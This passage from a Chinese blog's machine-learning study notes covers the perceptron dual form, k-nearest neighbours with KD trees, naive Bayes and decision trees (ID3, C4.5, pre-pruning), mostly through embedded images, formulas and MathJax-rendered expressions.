class="" title="例题分析"><img src="/posts/498ab7d9/2.3.5.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.3.6.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.3.7.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.3.8.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.3.9.png" class="" title="例题分析"><h2 id="2-4-感知机的对偶形式"><a href="#2-4-感知机的对偶形式" class="headerlink" title="2.4 感知机的对偶形式"></a>2.4 感知机的对偶形式</h2><img src="/posts/498ab7d9/2.4.1.png" class="" title="原始形式"><img src="/posts/498ab7d9/2.4.2.png" class="" title="原始形式"><p>对偶形式的算法：</p><img src="/posts/498ab7d9/2.4.3.png" class="" title="对偶形式的算法"><img src="/posts/498ab7d9/2.4.4.png" class="" title="对偶形式的算法"><p>例题分析：</p><img src="/posts/498ab7d9/2.4.5.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.4.6.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.4.7.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.4.8.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.4.9.png" class="" title="例题分析"><h2 id="2-5-算法的收敛性"><a href="#2-5-算法的收敛性" class="headerlink" title="2.5 算法的收敛性"></a>2.5 算法的收敛性</h2><img src="/posts/498ab7d9/2.5.1.png" class="" title="定理"><img src="/posts/498ab7d9/2.5.2.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.3.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.4.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.5.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.6.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.7.png" class="" title="算法的收敛性"><h1 id="3-K近邻"><a href="#3-K近邻" class="headerlink" title="3. K近邻"></a>3. K近邻</h1><h2 id="3-1-K近邻相关概念"><a href="#3-1-K近邻相关概念" class="headerlink" title="3.1 K近邻相关概念"></a>3.1 K近邻相关概念</h2><img src="/posts/498ab7d9/3.1.1.png" class="" title="K近邻概念"><img src="/posts/498ab7d9/3.1.2.png" class="" title="K近邻直观理解"><p>K近邻算法：</p><img src="/posts/498ab7d9/3.1.3.png" class="" title="K近邻算法"><p>误差率：</p><img src="/posts/498ab7d9/3.1.4.png" class="" title="误差率"><img src="/posts/498ab7d9/3.1.5.png" class="" title="误差率"><img src="/posts/498ab7d9/3.1.6.png" class="" title="误差率"><img src="/posts/498ab7d9/3.1.7.png" class="" title="误差率"><h2 id="3-2-K近邻三要素"><a href="#3-2-K近邻三要素" class="headerlink" title="3.2 K近邻三要素"></a>3.2 K近邻三要素</h2><h3 id="3-2-1-K近邻模型"><a href="#3-2-1-K近邻模型" class="headerlink" title="3.2.1 K近邻模型"></a>3.2.1 K近邻模型</h3><img src="/posts/498ab7d9/3.2.1.png" class="" title="K近邻模型"><h3 id="3-2-2-距离度量"><a href="#3-2-2-距离度量" class="headerlink" title="3.2.2 距离度量"></a>3.2.2 距离度量</h3><img src="/posts/498ab7d9/3.2.2.png" class="" title="距离度量"><img src="/posts/498ab7d9/3.2.3.png" class="" title="距离度量"><img src="/posts/498ab7d9/3.2.4.png" class="" title="例子"><img src="/posts/498ab7d9/3.2.5.png" class="" title="例子"><img src="/posts/498ab7d9/3.2.6.png" class="" title="例子"><h3 id="3-2-3-K值的选择"><a href="#3-2-3-K值的选择" class="headerlink" title="3.2.3 K值的选择"></a>3.2.3 K值的选择</h3><p>近似误差：可以理解为对现有训练集的训练误差。</p><p>估计误差：可以理解为对测试集的测试误差。</p><img src="/posts/498ab7d9/3.2.7.png" class="" title="K值的选择"><h3 id="3-2-4-分类决策规则"><a href="#3-2-4-分类决策规则" class="headerlink" title="3.2.4 分类决策规则"></a>3.2.4 分类决策规则</h3><img src="/posts/498ab7d9/3.2.8.png" class="" title="分类决策规则"><img src="/posts/498ab7d9/3.2.9.png" class="" title="分类决策规则"><img src="/posts/498ab7d9/3.2.10.png" class="" title="分类决策规则"><h2 id="3-3-构造KD树"><a href="#3-3-构造KD树" class="headerlink" title="3.3 构造KD树"></a>3.3 构造KD树</h2><img src="/posts/498ab7d9/3.3.1.png" class="" title="什么是KD树"><img src="/posts/498ab7d9/3.3.2.png" class="" title="构造KD树"><p>例子：</p><img src="/posts/498ab7d9/3.3.3.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.4.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.5.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.6.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.7.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.8.png" class="" title="构造KD树例子"><h2 id="3-4-搜索KD树"><a href="#3-4-搜索KD树" class="headerlink" title="3.4 搜索KD树"></a>3.4 搜索KD树</h2><p>最近邻搜索：</p><ul><li>寻找“当前最近点”：寻找最近邻的子结点作为目标点的“当前最近点”</li><li>回溯：以目标点和“当前最近点”的距离沿树根部进行回溯和迭代</li></ul><p>最近邻搜索算法：</p><img src="/posts/498ab7d9/3.4.1.png" class="" title="最近邻搜索算法"><p>例子：</p><img src="/posts/498ab7d9/3.4.2.png" class="" title="最近邻搜索算法例子"><img src="/posts/498ab7d9/3.4.3.png" class="" title="最近邻搜索算法例子"><img src="/posts/498ab7d9/3.4.4.png" class="" title="最近邻搜索算法例子"><h1 id="4-朴素贝叶斯法"><a href="#4-朴素贝叶斯法" class="headerlink" title="4. 朴素贝叶斯法"></a>4. 朴素贝叶斯法</h1><h2 id="4-1-贝叶斯定理"><a href="#4-1-贝叶斯定理" class="headerlink" title="4.1 贝叶斯定理"></a>4.1 贝叶斯定理</h2><p>条件概率：</p><script type="math/tex; mode=display">P(X=x|Y=y_i)=\frac {P(X=x,Y=y_i)}{P(Y=y_i)}</script><p>全概率公式：</p><script type="math/tex; mode=display">P(X=x)=\sum_{i=1}^nP(Y=y_i)P(X=x|Y=y_i)</script><p>贝叶斯公式：</p><script type="math/tex; mode=display">P(Y=y_i|X=x)=\frac {P(X=x,Y=y_i)}{P(X=x)}=\frac{P(Y=y_i)P(X=x|Y=y_i)}{\sum_{i=1}^nP(Y=y_i)P(X=x|Y=y_i)}</script><img src="/posts/498ab7d9/4.1.3.png" class="" title="贝叶斯定理"><img src="/posts/498ab7d9/4.1.4.png" class="" title="朴素贝叶斯"><img src="/posts/498ab7d9/4.1.5.png" class="" title="朴素贝叶斯分类"><h2 id="4-2-何为朴素"><a href="#4-2-何为朴素" class="headerlink" title="4.2 何为朴素"></a>4.2 何为朴素</h2><img src="/posts/498ab7d9/4.1.1.png" class="" title="朴素贝叶斯"><img src="/posts/498ab7d9/4.1.2.png" class="" title="朴素贝叶斯"><p>参数个数：</p><img src="/posts/498ab7d9/4.2.1.png" class="" title="朴素贝叶斯"><p>“朴素”即为条件独立性假设，即特征之间相互独立。</p><img src="/posts/498ab7d9/4.2.2.png" class="" title="朴素贝叶斯"><h2 id="4-3-后验概率最大化"><a href="#4-3-后验概率最大化" class="headerlink" title="4.3 后验概率最大化"></a>4.3 后验概率最大化</h2><p>将期望风险最小化转化为后验概率最大化的问题。</p><img src="/posts/498ab7d9/4.3.1.png" class="" title="后验概率最大化"><h2 id="4-4-极大似然估计"><a href="#4-4-极大似然估计" class="headerlink" title="4.4 极大似然估计"></a>4.4 极大似然估计</h2><img src="/posts/498ab7d9/4.4.1.png" class="" title="先验概率与条件概率"><p>极大似然估计原理：</p><img src="/posts/498ab7d9/4.4.2.png" class="" title="极大似然估计原理"><p>极大似然估计实现：</p><img src="/posts/498ab7d9/4.4.3.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.4.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.5.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.6.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.7.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.8.png" class="" title="极大似然估计例子"><h2 id="4-5-算法"><a href="#4-5-算法" class="headerlink" title="4.5 算法"></a>4.5 算法</h2><img src="/posts/498ab7d9/4.5.1.png" class="" title="朴素贝叶斯算法"><img src="/posts/498ab7d9/4.5.2.png" class="" title="朴素贝叶斯例子"><img src="/posts/498ab7d9/4.5.3.png" class="" title="朴素贝叶斯例子"><h2 id="4-6-贝叶斯估计"><a href="#4-6-贝叶斯估计" class="headerlink" title="4.6 贝叶斯估计"></a>4.6 贝叶斯估计</h2><img src="/posts/498ab7d9/4.6.1.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.2.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.3.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.4.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.5.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.6.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.7.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.8.png" class="" title="正则化"><img src="/posts/498ab7d9/4.6.9.png" class="" title="贝叶斯估计"><h1 id="5-决策树"><a href="#5-决策树" class="headerlink" title="5. 决策树"></a>5. 决策树</h1><p>分类决策树模型是一种描述对实例进行分类的树形结构。</p><img src="/posts/498ab7d9/5.1.1.png" class="" title="决策树"><p>决策树是通过一系列规则对数据进行分类的过程。</p><p>If-Then规则：</p><img src="/posts/498ab7d9/5.1.2.png" class="" title="If-Then规则"><p>构建决策树：</p><ol><li>构建根节点</li><li>选择最优特征，以此分割训练数据集</li><li>若子集被基本正确分类，构建叶结点；否则，继续选择新的最优特征</li><li>重复2、3步，直到所有训练数据子集被正确分类</li></ol><h2 id="5-1-条件概率分布"><a href="#5-1-条件概率分布" class="headerlink" title="5.1 条件概率分布"></a>5.1 条件概率分布</h2><img src="/posts/498ab7d9/5.1.3.png" class="" title="条件概率分布"><p>当单元c的条件概率满足<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="23.556ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10411.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(751,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1140,0)"><path data-c="1D44C" d="M66 637Q54 637 49 637T39 638T32 641T30 647T33 664T42 682Q44 683 56 683Q104 680 165 680Q288 680 306 683H316Q322 677 322 674T320 656Q316 643 310 637H298Q242 637 242 624Q242 619 292 477T343 333L346 336Q350 340 358 349T379 373T411 410T454 461Q546 568 561 587T577 618Q577 634 545 637Q528 637 528 647Q528 649 530 661Q533 676 535 679T549 683Q551 683 578 682T657 680Q684 680 713 681T746 682Q763 682 763 673Q763 669 760 657T755 643Q753 637 734 637Q662 632 617 587Q608 578 477 424L348 273L322 169Q295 62 295 57Q295 46 363 46Q379 46 384 45T390 35Q390 33 388 23Q384 6 382 4T366 1Q361 1 324 1T232 2Q170 2 138 2T102 1Q84 1 84 9Q84 14 87 24Q88 27 89 30T90 35T91 39T93 42T96 44T101 45T107 45T116 46T129 46Q168 47 180 50T198 63Q201 68 227 171L252 274L129 623Q128 624 127 625T125 627T122 629T118 631T113 633T105 634T96 635T83 636T66 637Z"></path></g><g data-mml-node="mo" transform="translate(2180.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3236.6,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(4014.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(4514.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(4792.6,0)"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mo" transform="translate(5922.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(6978.1,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(7411.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8077.9,0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"></path></g><g data-mml-node="mn" transform="translate(9133.7,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)"></path></g></g></g></svg></mjx-container>时，则认为该单元属于正类。</p><img src="/posts/498ab7d9/5.1.4.png" class="" title="条件概率分布"><h2 id="5-2-决策树学习"><a href="#5-2-决策树学习" class="headerlink" title="5.2 决策树学习"></a>5.2 决策树学习</h2><img src="/posts/498ab7d9/5.2.1.png" class="" title="决策树学习"><img src="/posts/498ab7d9/5.2.2.png" class="" title="决策树学习"><h2 id="5-3-特征选择"><a href="#5-3-特征选择" class="headerlink" title="5.3 特征选择"></a>5.3 特征选择</h2><img src="/posts/498ab7d9/5.2.3.png" class="" title="特征选择"><img src="/posts/498ab7d9/5.2.4.png" class="" title="特征选择"><img src="/posts/498ab7d9/5.2.5.png" class="" title="特征选择"><p>根据选择不同的特征作为根结点所得到的决策树不同。那么，如何进行特征选择呢？信息增益。</p><img src="/posts/498ab7d9/5.2.6.png" class="" title="熵"><img src="/posts/498ab7d9/5.2.7.png" class="" title="信息增益"><img src="/posts/498ab7d9/5.2.8.png" class="" title="信息增益"><p>例子：</p><img src="/posts/498ab7d9/5.2.9.png" class="" title="经验熵"><p>计算年龄特征的经验条件熵：</p><img src="/posts/498ab7d9/5.2.10.png" class="" title="条件经验熵"><p>计算工作特征的经验条件熵：</p><img src="/posts/498ab7d9/5.2.11.png" class="" title="条件经验熵"><p>计算有房子特征的经验条件熵：</p><img src="/posts/498ab7d9/5.2.12.png" class="" title="条件经验熵"><p>计算信贷情况特征的经验条件熵：</p><img src="/posts/498ab7d9/5.2.13.png" class="" title="条件经验熵"><p>信息增益：</p><img src="/posts/498ab7d9/5.2.14.png" class="" title="信息增益"><p>哪个带来的信息增益最大选哪个特征作为根结点。</p><p>信息增益比：</p><img src="/posts/498ab7d9/5.2.17.png" class="" title="信息增益比"><img src="/posts/498ab7d9/5.2.15.png" class="" title="信息增益比"><p>哪个信息增益比最大选哪个特征作为根结点。</p><p>信息增益倾向于某个取值较多的特征，信息增益比倾向于某个取值较少的特征。</p><img src="/posts/498ab7d9/5.2.16.png" class="" title="信息增益与信息增益比"><h2 id="5-4-决策树的生成"><a href="#5-4-决策树的生成" class="headerlink" title="5.4 决策树的生成"></a>5.4 决策树的生成</h2><h3 id="5-4-1-ID3算法"><a href="#5-4-1-ID3算法" class="headerlink" title="5.4.1 ID3算法"></a>5.4.1 ID3算法</h3><img src="/posts/498ab7d9/5.2.18.png" class="" title="ID3算法"><h3 id="5-4-2-C4-5算法"><a href="#5-4-2-C4-5算法" class="headerlink" title="5.4.2 C4.5算法"></a>5.4.2 C4.5算法</h3><img src="/posts/498ab7d9/5.2.19.png" class="" title="C4.5算法"><p>例子：</p><img src="/posts/498ab7d9/5.2.20.png" class="" title="C4.5算法例子"><img src="/posts/498ab7d9/5.2.21.png" class="" title="C4.5算法例子"><img src="/posts/498ab7d9/5.2.22.png" class="" title="C4.5算法例子"><img src="/posts/498ab7d9/5.2.23.png" class="" title="C4.5算法例子"><img src="/posts/498ab7d9/5.2.24.png" class="" title="C4.5算法例子"><img src="/posts/498ab7d9/5.2.25.png" class="" title="C4.5算法例子"><img src="/posts/498ab7d9/5.2.26.png" class="" title="C4.5算法例子"><h2 id="5-5-剪枝"><a href="#5-5-剪枝" class="headerlink" title="5.5 剪枝"></a>5.5 剪枝</h2><img src="/posts/498ab7d9/5.5.1.png" class="" title="剪枝"><img src="/posts/498ab7d9/5.5.2.png" class="" title="剪枝"><img src="/posts/498ab7d9/5.5.3.png" class="" title="剪枝"><h3 id="5-5-1-预剪枝"><a href="#5-5-1-预剪枝" class="headerlink" title="5.5.1 预剪枝"></a>5.5.1 预剪枝</h3><p>预剪枝的几个方法：</p><ol><li>限定决策树的深度</li><li>设置一个阈值</li><li>设置某个指标，比较结点划分前后的泛化能力</li></ol><p>例子：</p><img src="/posts/498ab7d9/5.5.4.png" class="" title="预剪枝"><p>深度为4，假设限定决策树的深度为2：</p><img src="/posts/498ab7d9/5.5.5.png" class="" title="预剪枝"><img src="/posts/498ab7d9/5.5.6.png" class="" title="预剪枝"><p>设定阈值为0.4：</p><img src="/posts/498ab7d9/5.5.7.png" class="" title="预剪枝"><p>设置阈值过大，导致欠拟合现象。</p><p>设置某个指标，比较结点划分前后的泛化能力：</p><img src="/posts/498ab7d9/5.5.8.png" class="" title="预剪枝"><p>此时的误差率为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.79ex" role="img" focusable="false" viewBox="0 -872.7 793.6 1233.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>。</p><img src="/posts/498ab7d9/5.5.9.png" class="" title="预剪枝"><img src="/posts/498ab7d9/5.5.10.png" class="" title="预剪枝"><p>经过计算，脐部特征的信息增益最大，将它作为根结点。判断测试集的泛化能力，误差率为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.773ex" role="img" focusable="false" viewBox="0 -864.9 793.6 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>，比之前的误差率小，所以应该继续往下递归。</p><img src="/posts/498ab7d9/5.5.11.png" class="" title="预剪枝"><p>在脐部的特征值为凹陷的训练集中，色泽的信息增益最大，将它作为子树。</p><img src="/posts/498ab7d9/5.5.12.png" class="" title="预剪枝"><p>此时算出误差率为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.771ex" role="img" focusable="false" viewBox="0 -864.2 793.6 1224.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>，比<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.773ex" role="img" focusable="false" viewBox="0 -864.9 793.6 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>大，所以泛化能力下降，应该将它预剪枝。</p><img src="/posts/498ab7d9/5.5.13.png" class="" title="预剪枝"><p>在脐部的特征值为稍凹的训练集中，根蒂的信息增益最大，将它作为子树。</p><img src="/posts/498ab7d9/5.5.14.png" class="" title="预剪枝"><p>此时算出误差率为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.773ex" role="img" focusable="false" viewBox="0 -864.9 793.6 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) 